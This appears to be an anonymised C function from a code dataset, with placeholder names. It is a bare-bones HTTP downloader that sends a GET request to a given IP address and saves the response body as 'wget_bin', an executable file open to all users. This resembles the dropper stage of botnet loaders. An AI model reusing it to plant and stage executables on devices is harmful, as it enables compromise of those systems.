
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
typedef int recvbuf ;


 int VAR_0 ;
 char* VAR_1 ;
 int VAR_2 ;
 char* VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (int) ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr_in*,int) ;
 int FUNC_4 (char*) ;
 int FUNC_5 (char*,int,int) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (int,char*,int) ;
 int FUNC_8 (int ,int ,int ) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int,char*,int) ;

int FUNC_11(int VAR_10, char **VAR_11)
{
    char VAR_12[128];
    struct sockaddr_in VAR_13;
    int VAR_14, VAR_15;
    unsigned int VAR_16 = 0;

    FUNC_10(VAR_9, VAR_3, VAR_4);

    VAR_13.sin_family = VAR_0;
    VAR_13.sin_port = FUNC_0(80);
    VAR_13.sin_addr.s_addr = FUNC_4(VAR_11[1]);

    VAR_15 = FUNC_5("wget_bin", VAR_7 | VAR_5 | VAR_6, 0777);
    VAR_14 = FUNC_8(VAR_0, VAR_8, 0);
    if (VAR_14 == -1 || VAR_15 == -1)
        FUNC_1(1);

    if (FUNC_3(VAR_14, &VAR_13, sizeof (struct sockaddr_in)) == -1)
        FUNC_1(2);

    FUNC_10(VAR_14, "GET ", 4);
    FUNC_10(VAR_14, VAR_11[2], FUNC_9(VAR_11[2]));
    FUNC_10(VAR_14, " HTTP/1.1\r\n", 11);
    FUNC_10(VAR_14, "Host: ", 6);
    FUNC_10(VAR_14, VAR_11[3], FUNC_9(VAR_11[3]));
    FUNC_10(VAR_14, "\r\nConnection: close\r\n\r\n", 23);

    while (VAR_16 != 0x0d0a0d0a)
    {
        char VAR_17;
        int VAR_18 = FUNC_7(VAR_14, &VAR_17, 1);

        if (VAR_18 != 1)
            FUNC_1(4);
        VAR_16 = (VAR_16 << 8) | VAR_17;
    }




    while (1)
    {
        int VAR_19 = FUNC_7(VAR_14, VAR_12, sizeof (VAR_12));

        if (VAR_19 <= 0)
            break;
        FUNC_10(VAR_15, VAR_12, VAR_19);
    }

    FUNC_2(VAR_14);
    FUNC_2(VAR_15);
    FUNC_10(VAR_9, VAR_1, VAR_2);
    FUNC_1(5);
}
